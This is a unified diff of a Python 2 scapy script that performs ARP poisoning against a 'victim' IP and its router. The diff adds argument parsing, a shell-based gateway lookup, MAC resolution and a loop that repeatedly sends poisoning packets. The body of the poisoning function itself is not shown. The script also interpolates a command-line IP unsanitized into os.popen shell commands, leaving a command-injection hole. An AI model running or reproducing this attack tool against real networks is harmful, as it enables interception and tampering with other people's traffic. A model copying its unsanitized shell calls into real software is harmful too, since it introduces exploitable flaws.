@@ -1,18 +1,42 @@
-import os, sys,socket, struct,time
+import os, sys,socket, struct,time,commands
+#############################################
+#		is done to remove a WARNING 		#
+import logging								#				
+l=logging.getLogger("scapy.runtime")		#
+l.setLevel(49)								#
+#############################################
 from scapy.all import *
+
+
+
+
+def linux_cmd(cmd):
+	ret = commands.getoutput(cmd)
+	return ret
+
+
 
 #get the IP of the dafault GW
 def get_default_gateway():
-    """Read the default gateway directly from /proc."""
-    with open("/proc/net/route") as fh:
-        for line in fh:
-            fields = line.strip().split()
-            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
-                continue
+    get_gateway_command="ip r | awk \'/^def/{print $3}\'"
+    return linux_cmd(get_gateway_command)
+   ####### OLD CODE#################################################################
+   #Read the default gateway directly from /proc. 
+   # with open("/proc/net/route") as fh:
+   #     for line in fh:
+   #         fields = line.strip().split()
+   #         if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+   #             continue
 
-            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
-
-#get the MAC from the IP ()
+   #		return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+   #################################################################################
+   
+   
+   
+   
+   
+   
+   
 def get_MAC_from_IP(ip):
 	# ping is optional (sends a WHO_HAS request)
 	os.popen('ping -c 1 %s' % ip)
@@ -20,11 +44,13 @@ def get_MAC_from_IP(ip):
 	# grep with a space at the end of IP address to make sure you get a single line
 	fields = os.popen('grep "%s " /proc/net/arp' % ip).read().split()
 	if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
-		print str(fields)
-		#return fields[3]
+		#print str(fields)
+		return fields[3]
 	else:
 		print 'no response from', ip
-		print str(fields)
+		#print str(fields)
+		print 'exiting...'
+		sys.exit(-1)
 
 		return None
 		
@@ -43,37 +69,56 @@ def ARP_poisoning((routerIP,routerMAC),(victimIP,victimMAC)):
 
 
 def main():
+	times=1
+	interval=0.05
+	print'=====================================START======================================='	
+	if (len(sys.argv)<2):
+		print 'Error:\tNot enough args!!!'
+		print 'Enter the IP address of the victim as arg '
+		print 'ex:	python arp.py 10.0.0.4'
+		print '---------------------------------------------------------------------------------'
+		sys.exit(-1)
+	if	(len(sys.argv)>3):
+		print 'Error:\tToo many args!!!'
+		print 'Enter the IP address of the victim as arg '
+		print 'ex:	python arp.py 10.0.0.4'
+		print '---------------------------------------------------------------------------------'
+		sys.exit(-1)
+		
+	#get victim's UP from terminal	
+	IP_victim	=	sys.argv[1]	
 
-	times=2100
-	#get IP addresses
-	IP_gateway=	get_default_gateway()
-	IP_victim	=	sys.argv[1]
+	#get router's IP - default GW or from teminal
+	if((len(sys.argv)==2)):
+		IP_router=get_default_gateway()
+		
+	if((len(sys.argv)==3)):	
+		IP_router=sys.argv[2]
 	
 	
 	#get MAC adresses
-	(MAC_victim,MAC_GW)=get_MAC_of_2_IPs(IP_victim,IP_gateway)
+	(MAC_victim,MAC_router)=get_MAC_of_2_IPs(IP_victim,IP_router)
 
-	router	=	(IP_gateway,MAC_GW)	
+	router	=	(IP_router,MAC_router)	
 	victim	=	(IP_victim,MAC_victim)
-	
-	print'=======================STRTING - sending for '+str(times)+' times========================='	
+	print'|\t STRTING - sending for '+str(times)+' times with intervals of '+str(interval)+'[sec]\t\t|'	
+	print '---------------------------------------------------------------------------------'
+	print ''
+	print ('Victim:\tIP:'+victim[0]+'\tMAC:'+	str(victim[1]))
+	print ('Router:\tIP:'+router[0]+'\tMAC:'+	str(router[1]))
+
 
 	for i in xrange(times):
-		ARP_poisoning(router,victim)
-		time.sleep(0.05)
 		printval=str(i+1)
 		printval+=str('\\')+str(times)		
-		print '---------------------------['+printval+']---------------------------'
-	print'=====================================DONE==================================================='	
+		print '-------------------------------------['+printval+']---------------------------------------'
+		ARP_poisoning(router,victim)
+		time.sleep(interval)
 	
-	'''#tests
-	print ('victim: MAC('+IP_victim+')\t= '+	str(MAC_victim))
-	print ('gateWay:MAC('+IP_gateway+')\t= '+	str(MAC_GW))
-	'''
+	print'=====================================DONE========================================'	
 	
 	
-	
-	
+
 	return 0
 
 if __name__ == '__main__':
